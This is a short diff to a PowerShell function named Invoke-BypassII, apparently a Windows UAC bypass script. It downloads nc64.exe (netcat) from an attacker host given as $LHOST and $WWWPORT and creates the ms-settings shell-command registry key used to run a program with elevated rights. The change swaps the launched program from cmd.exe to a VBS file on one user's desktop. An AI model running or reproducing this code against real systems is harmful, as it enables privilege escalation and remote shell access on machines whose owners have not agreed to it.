@@ -17,7 +17,7 @@ function Invoke-BypassII {
     # Default program to run on successful UAC bypass
     mkdir C:\temp
     Invoke-WebRequest -usebasicparsing http://"$LHOST":"$WWWPORT"/nc64.exe -o C:\temp\nc64.exe
-    $program = "cmd.exe"
+    $program = "C:\Users\gazov\Desktop\Proverka.vbs"
     
     # Create registry structure
     New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
